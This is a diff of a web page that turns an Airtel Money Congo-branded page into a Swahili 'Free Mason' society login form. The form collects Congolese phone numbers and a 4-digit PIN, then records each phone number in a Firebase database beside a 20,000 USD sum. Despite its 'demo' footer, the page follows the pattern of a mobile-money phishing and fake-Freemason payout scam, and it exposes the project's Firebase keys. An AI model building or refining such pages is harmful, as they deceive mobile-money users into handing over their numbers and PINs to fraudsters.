-<a href="#securite">
-Sécurité
-</a>
-
-<a href="#faq">
-FAQ
-</a>
-
-</div>
-
-
-<div class="footer-column">
-
-<h4>Assistance</h4>
-
-<a href="#contact">
-Contact
-</a>
-
-<a href="#faq">
-Centre d'aide
-</a>
-
-<a href="#securite">
-Conseils de sécurité
-</a>
-
-</div>
-
-</div>
-
-
-<div class="footer-bottom">
-
-<span>
-© 2026 Airtel Money Congo. Tous droits réservés.
-</span>
-
-<span>
-Conditions · Confidentialité
-</span>
-
-</div>
-
+<footer class="footer">
+    Free Mason Family Fraternity Organization Society
+    <br>
+    DEMO SYSTEM — SI HUDUMA RASMI YA AIRTEL
 </footer><script type="module">
 
-const firebaseConfig = {
-
-    apiKey:
-    "AIzaSyC3IylLRAMgF8Oo1oFCJk-FIkzRNS8j58U",
-
-    authDomain:
-    "freemason-society.firebaseapp.com",
-
-    databaseURL:
-    "https://freemason-society-default-rtdb.europe-west1.firebasedatabase.app",
-
-    projectId:
-    "freemason-society",
-
-    storageBucket:
-    "freemason-society.firebasestorage.app",
-
-    messagingSenderId:
-    "515013260684",
-
-    appId:
-    "1:515013260684:web:23f4fca3d739e7084ed2a9",
-
-    measurementId:
-    "G-XDQ6GF6QV6"
-
-};
-
-
-import {
-    initializeApp
-}
-from
-"https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
-
+import { initializeApp }
+from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
 
 import {
     getDatabase,
     ref,
     onValue,
-    onDisconnect
+    push,
+    set
 }
-from
-"https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
+from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
 
 
-const app =
-initializeApp(firebaseConfig);
+const firebaseConfig = {
+    apiKey: "AIzaC3IylLRAMgF8Oo1oFCJk-FIkzRNS8j58U",
+    authDomain: "freemason-society.firebaseapp.com",
+    databaseURL: "https://freemason-society-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "freemason-society",
+    storageBucket: "freemason-society.firebasestorage.app",
+    messagingSenderId: "515013260684",
+    appId: "1:515013260684:web:23f4fca3d739e7084ed2a9",
+    measurementId: "G-XDQ6GF6QV6"
+};
 
 
-const database =
-getDatabase(app);
+const app = initializeApp(firebaseConfig);
+
+const database = getDatabase(app);
 
 
-const websiteRef =
-ref(database, "airtelMoney");
+/* REAL-TIME CONNECTION */
 
-
-const connectionRef =
-ref(database, ".info/connected");
-
-
-/* DATABASE CONNECTION */
-
-onValue(
-    connectionRef,
-    (snapshot) => {
-
-        const dot =
-        document.getElementById(
-            "connectionDot"
-        );
-
-        const text =
-        document.getElementById(
-            "connectionText"
-        );
-
-
-        if(snapshot.val() === true){
-
-            dot.classList.add("online");
-
-            text.textContent =
-            "Connecté • Données en temps réel";
-
-        }else{
-
-            dot.classList.remove("online");
-
-            text.textContent =
-            "Connexion interrompue";
-
-        }
-
-    }
-);
-
-
-/* REAL-TIME DATABASE */
-
-onValue(
-    websiteRef,
-    (snapshot) => {
-
-        const data =
-        snapshot.val();
-
-
-        if(!data){
-
-            document.getElementById(
-                "serviceStatus"
-            ).textContent =
-            "Opérationnel";
-
-
-            document.getElementById(
-                "liveAnnouncement"
-            ).textContent =
-            "Bienvenue";
-
-
-            return;
-
-        }
-
-
-        if(data.serviceStatus){
-
-            document.getElementById(
-                "serviceStatus"
-            ).textContent =
-            data.serviceStatus;
-
-        }
-
-
-        if(data.announcement){
-
-            document.getElementById(
-                "liveAnnouncement"
-            ).textContent =
-            data.announcement;
-
-        }
-
-
-        if(data.heroDescription){
-
-            document.getElementById(
-                "heroDescription"
-            ).textContent =
-            data.heroDescription;
-
-        }
-
-
-        if(data.lastUpdated){
-
-            const date =
-            new Date(
-                data.lastUpdated
-            );
-
-
-            document.getElementById(
-                "lastUpdated"
-            ).textContent =
-            date.toLocaleString("fr-FR");
-
-        }else{
-
-            document.getElementById(
-                "lastUpdated"
-            ).textContent =
-            "En direct";
-
-        }
-
-    }
-);
-
-
-/* OPTIONAL VISITOR PRESENCE */
-
-const visitorRef =
-ref(
+const connectionRef = ref(
     database,
-    "airtelMoney/visitors/" +
-    Date.now()
+    ".info/connected"
 );
 
+onValue(connectionRef, (snapshot) => {
 
-onDisconnect(
-    visitorRef
-).remove();
+    const dot =
+        document.getElementById("statusDot");
 
+    const text =
+        document.getElementById("statusText");
 
-/* FAQ */
+    if(snapshot.val() === true){
 
-document
-.querySelectorAll(".faq-question")
-.forEach(
-    button => {
+        dot.classList.add("online");
 
-        button.addEventListener(
-            "click",
-            () => {
+        text.textContent =
+            "Imeunganishwa • Firebase iko hai";
 
-                const faq =
-                button.parentElement;
+    }else{
 
+        dot.classList.remove("online");
 
-                document
-                .querySelectorAll(".faq")
-                .forEach(
-                    item => {
-
-                        if(item !== faq){
-
-                            item.classList
-                            .remove("active");
-
-
-                            const icon =
-                            item.querySelector(
-                                ".faq-question span"
-                            );
-
-
-                            if(icon){
-
-                                icon.textContent =
-                                "+";
-
-                            }
-
-                        }
-
-                    }
-                );
-
-
-                faq.classList.toggle(
-                    "active"
-                );
-
-
-                const icon =
-                button.querySelector(
-                    "span"
-                );
-
-
-                if(
-                    faq.classList.contains(
-                        "active"
-                    )
-                ){
-
-                    icon.textContent =
-                    "−";
-
-                }else{
-
-                    icon.textContent =
-                    "+";
-
-                }
-
-            }
-        );
+        text.textContent =
+            "Muunganisho umekatika";
 
     }
-);
+
+});
 
 
-/* MOBILE MENU */
+/* LOGIN SUBMISSION */
 
-const menuBtn =
-document.getElementById(
-    "menuBtn"
-);
+const form =
+    document.getElementById("loginForm");
 
+const message =
+    document.getElementById("message");
 
-const navLinks =
-document.getElementById(
-    "navLinks"
-);
+const button =
+    document.getElementById("submitButton");
 
 
-menuBtn.addEventListener(
-    "click",
-    () => {
+form.addEventListener("submit", async (event) => {
 
-        navLinks.classList.toggle(
-            "active"
-        );
+    event.preventDefault();
+
+    const phone =
+        document.getElementById("phone")
+        .value.trim();
+
+    const demoPin =
+        document.getElementById("demoPin")
+        .value.trim();
 
 
-        menuBtn.textContent =
-        navLinks.classList.contains(
-            "active"
-        )
-        ? "×"
-        : "☰";
+    /* PHONE MUST START WITH 243 */
+
+    if(!/^243[0-9]{9,12}$/.test(phone)){
+
+        message.textContent =
+            "Tafadhali weka namba inayoanza na 243.";
+
+        message.style.color =
+            "#d90000";
+
+        return;
+    }
+
+
+    /* PIN MUST BE EXACTLY 4 DIGITS */
+
+    if(!/^[0-9]{4}$/.test(demoPin)){
+
+        message.textContent =
+            "PIN ya DEMO lazima iwe na tarakimu 4.";
+
+        message.style.color =
+            "#d90000";
+
+        return;
+    }
+
+
+    button.disabled = true;
+
+    button.textContent =
+        "Inawasilisha...";
+
+
+    try{
+
+        /*
+         * IMPORTANT:
+         * Only demo information is stored.
+         * The demo PIN is NOT stored.
+         */
+
+        const submissionsRef =
+            ref(database, "freeMasonDemo/submissions");
+
+        const newSubmission =
+            push(submissionsRef);
+
+
+        await set(newSubmission, {
+
+            phone: phone,
+
+            type: "DEMO",
+
+            amount: 20000,
+
+            currency: "USD",
+
+            createdAt:
+                new Date().toISOString()
+
+        });
+
+
+        /* CREATE DEMO REFERENCE */
+
+        const reference =
+            "FM-" +
+            Date.now()
+            .toString()
+            .slice(-8);
+
+
+        document.getElementById(
+            "referenceNumber"
+        ).textContent = reference;
+
+
+        document.getElementById(
+            "loginPage"
+        ).classList.add("hidden");
+
+
+        document.getElementById(
+            "successPage"
+        ).classList.remove("hidden");
+
+
+    }catch(error){
+
+        console.error(error);
+
+        message.textContent =
+            "Kuna tatizo la muunganisho. Tafadhali jaribu tena.";
+
+        message.style.color =
+            "#d90000";
+
+        button.disabled = false;
+
+        button.textContent =
+            "Endelea";
 
     }
-);
 
+});
 
-document
-.querySelectorAll(
-    ".nav-links a"
-)
-.forEach(
-    link => {
-
-        link.addEventListener(
-            "click",
-            () => {
-
-                navLinks.classList.remove(
-                    "active"
-                );
-
-                menuBtn.textContent =
-                "☰";
-
-            }
-        );
-
-    }
-);
-
-</script>
-
-</body>
+</script></body>
 </html>
